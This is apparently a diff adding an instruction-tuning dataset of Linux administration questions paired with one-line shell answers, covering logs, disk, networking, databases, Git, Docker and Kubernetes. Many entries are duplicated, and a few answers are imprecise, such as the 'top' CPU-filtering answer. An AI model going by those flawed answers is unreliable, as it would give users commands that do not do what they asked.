@@ -1,0 +1,2374 @@
+[
+  {
+    "instruction": "Display the last 20 lines of the systemd journal.",
+    "response": "journalctl -n 20",
+    "mission_tag": "logs:view",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["journalctl"],
+    "os_compatibility": ["Linux", "systemd"],
+    "follow_up": [
+      "How do I filter journal logs by service?",
+      "How to follow journal logs in real-time?"
+    ]
+  },
+  {
+    "instruction": "The output of `df -h` shows /dev/sda1 is 98% full. Find the 10 largest files in the /var directory.",
+    "response": "du -ah /var | sort -rh | head -n 10",
+    "mission_tag": "disk:usage",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["du", "sort", "head"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How do I clean up disk space safely?",
+      "How to automate disk usage reports?"
+    ]
+  },
+  {
+    "instruction": "A user reports a 'permission denied' error when accessing '/srv/www/index.html'. What command should I use to check the file's permissions?",
+    "response": "ls -l /srv/www/index.html",
+    "mission_tag": "permissions:check",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["ls"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How to change file permissions to allow read access?",
+      "How to check directory permissions for /srv/www?"
+    ]
+  },
+  {
+    "instruction": "Analyze this log entry: `sshd[2189]: Failed password for root from 203.0.113.55 port 48240 ssh2`. What is happening?",
+    "response": "This is a failed SSH login attempt for the 'root' user from IP address 203.0.113.55. This could be part of a brute-force attack.",
+    "mission_tag": "security:login_attempt",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["sshd", "log analysis"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How do I block this IP using firewall rules?",
+      "How to configure fail2ban to prevent brute-force attacks?"
+    ]
+  },
+  {
+    "instruction": "What command shows the current disk usage in a human-readable format?",
+    "response": "df -h",
+    "mission_tag": "disk:usage",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["df"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How to monitor disk usage periodically?",
+      "How to find disk usage by specific users?"
+    ]
+  },
+  {
+    "instruction": "How do I check the status and recent logs of a service named 'webapp'?",
+    "response": "systemctl status webapp && journalctl -u webapp -n 50",
+    "mission_tag": "service:status",
+    "context": {
+      "requires_root": true,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["systemctl", "journalctl"],
+    "os_compatibility": ["Linux", "systemd"],
+    "follow_up": [
+      "How do I restart the webapp service?",
+      "How to enable webapp service to start on boot?"
+    ]
+  },
+  {
+    "instruction": "Find all files named 'README.txt' in the entire system, ignoring case sensitivity.",
+    "response": "find / -iname README.txt",
+    "mission_tag": "filesystem:search",
+    "context": {
+      "requires_root": true,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["find"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How to search for files modified in the last 7 days?",
+      "How to search for files by size?"
+    ]
+  },
+  {
+    "instruction": "Change the group of 'file.txt' to 'developers' without altering the user owner.",
+    "response": "chown :developers file.txt",
+    "mission_tag": "permissions:change",
+    "context": {
+      "requires_root": true,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["chown"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How to change ownership recursively?",
+      "How to set default group permissions?"
+    ]
+  },
+  {
+    "instruction": "Set the permissions of 'script.sh' to 755 using octal notation.",
+    "response": "chmod 755 script.sh",
+    "mission_tag": "permissions:set",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["chmod"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "What do the numbers in chmod 755 mean?",
+      "How to add execute permission for all users?"
+    ]
+  },
+  {
+    "instruction": "Create a new user named 'jdoe' and also create their home directory.",
+    "response": "useradd -m jdoe",
+    "mission_tag": "user:management",
+    "context": {
+      "requires_root": true,
+      "disruptive": true,
+      "interactive": false
+    },
+    "tools": ["useradd"],
+    "os_compatibility": ["Linux"],
+    "follow_up": [
+      "How to assign a password to the new user?",
+      "How to add the user to specific groups?"
+    ]
+  },
+  {
+    "instruction": "Create a compressed tar archive (tar.gz) of a directory.",
+    "response": "tar cvzf archive.tar.gz /path/to/directory",
+    "mission_tag": "archive:create",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["tar"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How to extract files from a tar.gz archive?",
+      "How to list contents of a tar.gz without extracting?"
+    ]
+  },
+  {
+    "instruction": "Replace only the first occurrence of the word 'database' with 'DB' on each line of 'config.txt'.",
+    "response": "sed 's/database/DB/' config.txt",
+    "mission_tag": "text:edit",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false
+    },
+    "tools": ["sed"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How to replace all occurrences of a word?",
+      "How to edit a file in-place with sed?"
+    ]
+  },
+  {
+    "instruction": "Download the content from 'https://example.com' and save it to a file named 'page.html'.",
+    "response": "curl -o page.html https://example.com",
+    "mission_tag": "network:download",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false,
+      "internet_required": true
+    },
+    "tools": ["curl"],
+    "os_compatibility": ["Linux", "Unix", "macOS"],
+    "follow_up": [
+      "How to download files in the background?",
+      "How to follow redirects with curl?"
+    ]
+  },
+  {
+    "instruction": "List all currently running Docker containers.",
+    "response": "docker ps",
+    "mission_tag": "container:list",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false,
+      "docker_required": true
+    },
+    "tools": ["docker"],
+    "os_compatibility": ["Linux", "Windows", "macOS"],
+    "follow_up": [
+      "How to stop a running container?",
+      "How to view logs of a Docker container?"
+    ]
+  },
+  {
+    "instruction": "How do I run an Ansible playbook against my inventory file?",
+    "response": "ansible-playbook -i /path/to/inventory /path/to/playbook.yml",
+    "mission_tag": "automation:ansible",
+    "context": {
+      "requires_root": false,
+      "disruptive": false,
+      "interactive": false,
+      "ansible_required": true
+    },
+    "tools": ["ansible-playbook"],
+    "os_compatibility": ["Linux", "Unix"],
+    "follow_up": [
+      "How to check syntax of an Ansible playbook?",
+      "How to run Ansible ad-hoc commands?"
+    ]
+  },
+  {
+  "instruction": "A process with PID 5432 is acting strangely. How can I trace all the system calls it's making in real-time?",
+  "response": "sudo strace -p 5432",
+  "mission_tag": "process:trace",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["strace"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to trace a process and its child processes?",
+    "How to save strace output to a file?"
+  ]
+},
+{
+  "instruction": "How do I see all the open files and network connections for a specific process ID?",
+  "response": "lsof -p <PID>",
+  "mission_tag": "process:inspect",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["lsof"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to list all open files for all processes?",
+    "How to filter lsof output by file type?"
+  ]
+},
+{
+  "instruction": "I want to see the current value of the kernel parameter for maximum open files.",
+  "response": "sysctl fs.file-max",
+  "mission_tag": "kernel:parameter",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["sysctl"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to change the maximum open files limit?",
+    "How to make kernel parameter changes persistent?"
+  ]
+},
+{
+  "instruction": "How do I change a kernel parameter temporarily, for example, enabling IP forwarding?",
+  "response": "sudo sysctl -w net.ipv4.ip_forward=1",
+  "mission_tag": "kernel:parameter",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["sysctl"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to make IP forwarding permanent?",
+    "How to list all current kernel parameters?"
+  ]
+},
+{
+  "instruction": "My server is very slow and I suspect disk I/O issues. How do I check I/O statistics?",
+  "response": "iostat -xz 1",
+  "mission_tag": "performance:io",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["iostat"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to monitor disk I/O over time?",
+    "How to identify which process is causing high I/O?"
+  ]
+},
+{
+  "instruction": "What command can I use to profile kernel functions and see what the system is spending its time on?",
+  "response": "Use `perf top`. It requires the `linux-tools-common` package.",
+  "mission_tag": "performance:profile",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["perf"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to record and analyze a perf trace?",
+    "How to profile a specific process with perf?"
+  ]
+},
+{
+  "instruction": "How do I clear the page cache, dentries, and inodes from memory to get a clean performance reading?",
+  "response": "echo 3 | sudo tee /proc/sys/vm/drop_caches",
+  "mission_tag": "performance:memory",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["tee"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to clear only the page cache?",
+    "What are the risks of dropping caches?"
+  ]
+},
+  {
+  "instruction": "How do I log in to a PostgreSQL database as the 'postgres' user?",
+  "response": "sudo -u postgres psql",
+  "mission_tag": "database:login",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["psql"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to list all databases in PostgreSQL?",
+    "How to change password for the postgres user?"
+  ]
+},
+{
+  "instruction": "Create a complete backup of a PostgreSQL database named 'production_db' and save it to a file.",
+  "response": "pg_dump -U postgres -h localhost production_db > production_db.sql",
+  "mission_tag": "database:backup",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["pg_dump"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to restore a PostgreSQL database from a backup?",
+    "How to compress the backup file?"
+  ]
+},
+{
+  "instruction": "How do I see all the currently active connections to my MySQL server?",
+  "response": "mysqladmin -u root -p processlist",
+  "mission_tag": "database:connections",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["mysqladmin"],
+  "os_compatibility": ["Linux", "Unix", "Windows"],
+  "follow_up": [
+    "How to kill a specific MySQL connection?",
+    "How to monitor MySQL server status?"
+  ]
+},
+{
+  "instruction": "How do I log in to a PostgreSQL database as the 'postgres' user?",
+  "response": "sudo -u postgres psql",
+  "mission_tag": "database:login",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["psql"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to list all databases in PostgreSQL?",
+    "How to change password for the postgres user?"
+  ]
+},
+{
+  "instruction": "Create a complete backup of a PostgreSQL database named 'production_db' and save it to a file.",
+  "response": "pg_dump -U postgres -h localhost production_db > production_db.sql",
+  "mission_tag": "database:backup",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["pg_dump"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to restore a PostgreSQL database from a backup?",
+    "How to compress the backup file?"
+  ]
+},
+{
+  "instruction": "How do I see all the currently active connections to my MySQL server?",
+  "response": "mysqladmin -u root -p processlist",
+  "mission_tag": "database:connections",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["mysqladmin"],
+  "os_compatibility": ["Linux", "Unix", "Windows"],
+  "follow_up": [
+    "How to kill a specific MySQL connection?",
+    "How to monitor MySQL server status?"
+  ]
+},
+{
+  "instruction": "I need to create a new user and database in MySQL and grant that user all privileges on the new database.",
+  "response": "CREATE DATABASE new_db; CREATE USER 'new_user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON new_db.* TO 'new_user'@'localhost';",
+  "mission_tag": "database:user_management",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["mysql"],
+  "os_compatibility": ["Linux", "Unix", "Windows"],
+  "follow_up": [
+    "How to revoke privileges from a MySQL user?",
+    "How to delete a MySQL user and database?"
+  ]
+},
+{
+  "instruction": "How can I check when user 'jdoe' last changed their password and when it expires?",
+  "response": "sudo chage -l jdoe",
+  "mission_tag": "user:password_info",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["chage"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to force user to change password on next login?",
+    "How to set password expiration for all users?"
+  ]
+},
+{
+  "instruction": "In `top`, how can I display only processes using more than 10% CPU?",
+  "response": "In top press 'O' then 'P', or use `top -b -o %CPU` and then filter output with grep for values >10",
+  "mission_tag": "performance:cpu",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["top", "grep"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to sort processes by memory usage?",
+    "How to export top output to a file?"
+  ]
+},
+{
+  "instruction": "How do I test network reachability and path to a host 'example.com'?",
+  "response": "Use `ping example.com` for reachability and `traceroute example.com` (or `tracepath example.com`) to see path hops.",
+  "mission_tag": "network:diagnose",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ping", "traceroute", "tracepath"],
+  "os_compatibility": ["Linux", "Unix", "Windows"],
+  "follow_up": [
+    "How to test connectivity to a specific port?",
+    "How to diagnose packet loss?"
+  ]
+},
+{
+  "instruction": "How can I list all listening TCP ports with the corresponding PID and process name?",
+  "response": "sudo ss -tulpn",
+  "mission_tag": "network:ports",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ss"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to filter for a specific port?",
+    "How to list UDP ports?"
+  ]
+},
+{
+  "instruction": "How do I check and repair the filesystem on /dev/sda1?",
+  "response": "sudo fsck -f /dev/sda1 (ensure the filesystem is unmounted or the system is in maintenance mode)",
+  "mission_tag": "filesystem:repair",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["fsck"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to check filesystem without making changes?",
+    "How to schedule fsck on next reboot?"
+  ]
+},
+{
+  "instruction": "How do I update GRUB configuration after modifying kernel parameters in /etc/default/grub?",
+  "response": "sudo update-grub",
+  "mission_tag": "bootloader:update",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["update-grub"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to revert GRUB changes?",
+    "How to add a custom boot entry?"
+  ]
+},
+{
+  "instruction": "How can I search for the string 'error' in both compressed and uncompressed log files under /var/log?",
+  "response": "grep -R 'error' /var/log; zgrep -R 'error' /var/log",
+  "mission_tag": "logs:search",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["grep", "zgrep"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to search for multiple keywords?",
+    "How to show surrounding lines for matches?"
+  ]
+},
+{
+  "instruction": "I changed a systemd unit file and need to restart just the service without rebooting, reverting if it fails. What commands?",
+  "response": "sudo systemctl daemon-reload; sudo systemctl try-restart SERVICE; or sudo systemctl restart SERVICE",
+  "mission_tag": "service:restart",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["systemctl"],
+  "os_compatibility": ["Linux", "systemd"],
+  "follow_up": [
+    "How to check service status after restart?",
+    "How to rollback a failed systemd change?"
+  ]
+},
+{
+  "instruction": "How can I create and enable a 2GB swap file?",
+  "response": "sudo fallocate -l 2G /swapfile; sudo chmod 600 /swapfile; sudo mkswap /swapfile; sudo swapon /swapfile; then add entry to /etc/fstab",
+  "mission_tag": "system:swap",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["fallocate", "chmod", "mkswap", "swapon"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to disable and remove a swap file?",
+    "How to check swap usage?"
+  ]
+},
+{
+  "instruction": "How do I check and change the maximum number of open files for my shell session?",
+  "response": "ulimit -n (to view), ulimit -n 4096 (to change temporarily); to make permanent, modify limits.conf",
+  "mission_tag": "system:limits",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ulimit"],
+  "os_compatibility": ["Linux", "Unix", "macOS"],
+  "follow_up": [
+    "How to set limits for all users?",
+    "How to check current limits for a process?"
+  ]
+},
+{
+  "instruction": "How do I check the status of my WireGuard VPN interface 'wg0' and see connected peers?",
+  "response": "sudo wg show wg0",
+  "mission_tag": "vpn:status",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["wg"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to restart the WireGuard interface?",
+    "How to add a new peer to WireGuard?"
+  ]
+},
+{
+  "instruction": "I need to generate a new private and public key pair for WireGuard.",
+  "response": "wg genkey | tee privatekey | wg pubkey > publickey",
+  "mission_tag": "vpn:keygen",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["wg", "tee"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to securely store WireGuard keys?",
+    "How to configure WireGuard with new keys?"
+  ]
+},
+{
+  "instruction": "How can I capture all network traffic on the 'eth0' interface that is going to or coming from port 443?",
+  "response": "sudo tcpdump -i eth0 'port 443'",
+  "mission_tag": "network:capture",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["tcpdump"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to save tcpdump output to a file?",
+    "How to filter traffic by IP address?"
+  ]
+},
+{
+  "instruction": "I need to find out which process is listening on TCP port 8080.",
+  "response": "sudo ss -tlpn | grep ':8080'",
+  "mission_tag": "network:ports",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ss", "grep"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to kill the process listening on port 8080?",
+    "How to list all listening ports?"
+  ]
+},
+{
+  "instruction": "How do I display my server's routing table?",
+  "response": "ip route show",
+  "mission_tag": "network:routing",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ip"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to add a new route?",
+    "How to delete a route?"
+  ]
+},
+{
+  "instruction": "I need to flush the DNS cache on a system running systemd.",
+  "response": "sudo systemd-resolve --flush-caches",
+  "mission_tag": "network:dns",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["systemd-resolve"],
+  "os_compatibility": ["Linux", "systemd"],
+  "follow_up": [
+    "How to check if DNS cache was flushed?",
+    "How to flush DNS cache on other distributions?"
+  ]
+},
+{
+  "instruction": "How do I test if a remote server 'db.example.com' has port 5432 open?",
+  "response": "nc -zv db.example.com 5432",
+  "mission_tag": "network:connectivity",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["nc"],
+  "os_compatibility": ["Linux", "Unix", "macOS"],
+  "follow_up": [
+    "How to test multiple ports at once?",
+    "How to test connectivity using telnet?"
+  ]
+},
+{
+  "instruction": "How do I run an Ansible playbook against my inventory file?",
+  "response": "ansible-playbook -i /path/to/inventory /path/to/playbook.yml",
+  "mission_tag": "automation:ansible",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "ansible_required": true
+  },
+  "tools": ["ansible-playbook"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to check syntax of an Ansible playbook?",
+    "How to run Ansible ad-hoc commands?"
+  ]
+},
+{
+  "instruction": "Using Ansible, how can I run a single command to check the uptime of all servers in my 'webservers' group?",
+  "response": "ansible webservers -m command -a 'uptime'",
+  "mission_tag": "automation:ansible",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "ansible_required": true
+  },
+  "tools": ["ansible"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to run a command on a specific host?",
+    "How to gather facts about all servers?"
+  ]
+},
+{
+  "instruction": "What is the command in Ansible to check for syntax errors in my playbook named `deploy.yml`?",
+  "response": "ansible-playbook --syntax-check deploy.yml",
+  "mission_tag": "automation:ansible",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "ansible_required": true
+  },
+  "tools": ["ansible-playbook"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to check for undefined variables in a playbook?",
+    "How to run a playbook in dry-run mode?"
+  ]
+},
+{
+  "instruction": "I need to create a new branch in Git called 'feature-new-login'.",
+  "response": "git checkout -b feature-new-login",
+  "mission_tag": "git:branch",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "git_required": true
+  },
+  "tools": ["git"],
+  "os_compatibility": ["Linux", "Unix", "Windows", "macOS"],
+  "follow_up": [
+    "How to push a new branch to remote?",
+    "How to list all branches?"
+  ]
+},
+{
+  "instruction": "How do I see the difference between my current changes and the last commit in Git?",
+  "response": "git diff",
+  "mission_tag": "git:diff",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "git_required": true
+  },
+  "tools": ["git"],
+  "os_compatibility": ["Linux", "Unix", "Windows", "macOS"],
+  "follow_up": [
+    "How to see changes for a specific file?",
+    "How to view staged changes?"
+  ]
+},
+{
+  "instruction": "I need to add all my current changes to staging and commit them with the message 'Implement new login API'.",
+  "response": "git add . && git commit -m 'Implement new login API'",
+  "mission_tag": "git:commit",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "git_required": true
+  },
+  "tools": ["git"],
+  "os_compatibility": ["Linux", "Unix", "Windows", "macOS"],
+  "follow_up": [
+    "How to amend the last commit?",
+    "How to push commits to remote?"
+  ]
+},
+{
+  "instruction": "How do I revert the last commit but keep the changes in my working directory?",
+  "response": "git reset --soft HEAD~1",
+  "mission_tag": "git:reset",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "git_required": true
+  },
+  "tools": ["git"],
+  "os_compatibility": ["Linux", "Unix", "Windows", "macOS"],
+  "follow_up": [
+    "How to revert a commit and discard changes?",
+    "How to undo a git reset?"
+  ]
+},
+{
+  "instruction": "List all currently running Docker containers.",
+  "response": "docker ps",
+  "mission_tag": "container:list",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "docker_required": true
+  },
+  "tools": ["docker"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to stop a running container?",
+    "How to view logs of a Docker container?"
+  ]
+},
+{
+  "instruction": "How do I view the real-time logs for a Docker container named 'webapp-prod'?",
+  "response": "docker logs -f webapp-prod",
+  "mission_tag": "container:logs",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "docker_required": true
+  },
+  "tools": ["docker"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to view logs for a specific time range?",
+    "How to save container logs to a file?"
+  ]
+},
+{
+  "instruction": "Remove all unused Docker images, containers, and networks to free up disk space.",
+  "response": "docker system prune -a",
+  "mission_tag": "container:cleanup",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false,
+    "docker_required": true
+  },
+  "tools": ["docker"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to remove only unused images?",
+    "How to check disk usage by Docker?"
+  ]
+},
+{
+  "instruction": "I need to get a shell inside a running Docker container with the ID 'a3b8e7c1d2e4'. How?",
+  "response": "docker exec -it a3b8e7c1d2e4 /bin/bash",
+  "mission_tag": "container:shell",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": true,
+    "docker_required": true
+  },
+  "tools": ["docker"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to run a command inside a container?",
+    "How to copy files into a container?"
+  ]
+},
+{
+  "instruction": "List all pods in the 'production' namespace in my Kubernetes cluster.",
+  "response": "kubectl get pods -n production",
+  "mission_tag": "kubernetes:list_pods",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "kubernetes_required": true
+  },
+  "tools": ["kubectl"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to list pods in all namespaces?",
+    "How to get detailed info about a pod?"
+  ]
+},
+{
+  "instruction": "A Kubernetes pod named 'auth-service-5f8d7b9c4c-xyz12' is stuck in a CrashLoopBackOff state. How do I see its logs to find the error?",
+  "response": "kubectl logs auth-service-5f8d7b9c4c-xyz12",
+  "mission_tag": "kubernetes:logs",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "kubernetes_required": true
+  },
+  "tools": ["kubectl"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to view previous logs for a pod?",
+    "How to describe pod events?"
+  ]
+},
+{
+  "instruction": "How can I get detailed information about a Kubernetes pod, including events, to diagnose why it won't start?",
+  "response": "kubectl describe pod <pod-name>",
+  "mission_tag": "kubernetes:describe_pod",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "kubernetes_required": true
+  },
+  "tools": ["kubectl"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to check pod resource limits?",
+    "How to view pod YAML configuration?"
+  ]
+},
+{
+  "instruction": "I need to scale my web application deployment in Kubernetes to 5 replicas.",
+  "response": "kubectl scale deployment/my-web-app --replicas=5",
+  "mission_tag": "kubernetes:scale",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "kubernetes_required": true
+  },
+  "tools": ["kubectl"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to scale a StatefulSet?",
+    "How to check deployment status?"
+  ]
+},
+{
+  "instruction": "How do I apply a YAML configuration file to my Kubernetes cluster?",
+  "response": "kubectl apply -f /path/to/your/config.yaml",
+  "mission_tag": "kubernetes:apply",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "kubernetes_required": true
+  },
+  "tools": ["kubectl"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to validate a YAML file before applying?",
+    "How to rollback a configuration change?"
+  ]
+},
+{
+  "instruction": "What command shows the resource usage (CPU/Memory) for all nodes in my Kubernetes cluster?",
+  "response": "kubectl top nodes",
+  "mission_tag": "kubernetes:monitor",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "kubernetes_required": true
+  },
+  "tools": ["kubectl"],
+  "os_compatibility": ["Linux", "Windows", "macOS"],
+  "follow_up": [
+    "How to monitor resource usage for pods?",
+    "How to set resource limits for nodes?"
+  ]
+},
+{
+  "instruction": "Display the last 20 lines of the systemd journal.",
+  "response": "journalctl -n 20",
+  "mission_tag": "logs:view",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["journalctl"],
+  "os_compatibility": ["Linux", "systemd"],
+  "follow_up": [
+    "How do I filter journal logs by service?",
+    "How to follow journal logs in real-time?"
+  ]
+},
+{
+  "instruction": "The output of `df -h` shows /dev/sda1 is 98% full. Find the 10 largest files in the /var directory.",
+  "response": "du -ah /var | sort -rh | head -n 10",
+  "mission_tag": "disk:usage",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["du", "sort", "head"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How do I clean up disk space safely?",
+    "How to automate disk usage reports?"
+  ]
+},
+{
+  "instruction": "A user reports a 'permission denied' error when accessing '/srv/www/index.html'. What command should I use to check the file's permissions?",
+  "response": "ls -l /srv/www/index.html",
+  "mission_tag": "permissions:check",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ls"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to change file permissions to allow read access?",
+    "How to check directory permissions for /srv/www?"
+  ]
+},
+{
+  "instruction": "Analyze this log entry: `sshd[2189]: Failed password for root from 203.0.113.55 port 48240 ssh2`. What is happening?",
+  "response": "This is a failed SSH login attempt for the 'root' user from IP address 203.0.113.55. This could be part of a brute-force attack.",
+  "mission_tag": "security:login_attempt",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["sshd", "log analysis"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How do I block this IP using firewall rules?",
+    "How to configure fail2ban to prevent brute-force attacks?"
+  ]
+},
+{
+  "instruction": "A web server is unresponsive. How would you start to diagnose the problem?",
+  "response": "First, check the service status with `systemctl status nginx` (or `apache2`). Second, check for listening ports with `ss -tuln`. Third, examine the error logs in `/var/log/nginx/error.log`.",
